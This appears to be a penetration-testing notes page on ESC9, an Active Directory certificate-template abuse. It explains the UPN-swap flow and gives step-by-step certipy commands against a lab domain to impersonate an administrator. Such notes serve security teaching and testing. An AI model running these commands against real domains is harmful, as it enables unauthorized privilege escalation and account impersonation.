# ESC9

## <mark style="color:yellow;">**ABOUT**</mark>

<mark style="color:red;">**ESC9**</mark> allows a user with **GenericWrite** (or equivalent control) over another domain user to impersonate any user (e.g., Domain Admin) by <mark style="color:purple;">**abusing a vulnerable certificate template that does not enforce UPN/SAN validation**</mark>. The attacker temporarily changes the controlled user's UPN to the victim's (e.g., administrator), requests a certificate, and then reverts the UPN. The issued certificate allows authentication as the victim.&#x20;

## <mark style="color:yellow;">FLOW</mark>

We need 2 users: User 1 who has **GenericWrite**, **GenericAll**, or **WriteProperty** over User2

* Then we change the UPN of User2 to User3 (user who we want to impersonate, admin),&#x20;
* Requesting certificate for User2 and tricking CA because of absent validation.&#x20;
* Then we revert back the UPN.&#x20;
* And authenticate with certificate.

## <mark style="color:yellow;">**EXPLOITATION**</mark>

#### Temporarily set user2’s UPN to admin

```bash
certipy account update -username "user1@militech.local" -hashes "aad3b435b51404eeaad3b435b51404ee" -user user2 -upn admin
```

#### Request certificate as user2 (with UPN = admin)

```bash
certipy req -username "user2@militech.local" -hashes "aad3b435b51404eeaad3b435b51404ee" -target ca.militech.local -ca militech-DC01-CA -template CertifiedAuthentication
```

#### Revert user2’s UPN back to original

```bash
certipy account update -username "user1@militech.local" -hashes "aad3b435b51404eeaad3b435b51404ee" -user user2 -upn "user2@militech.local"
```

#### Authenticate with the certificate as admin

```bash
certipy auth -pfx admin.pfx -domain militech.local -target 13.13.13.13
```

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template" %}
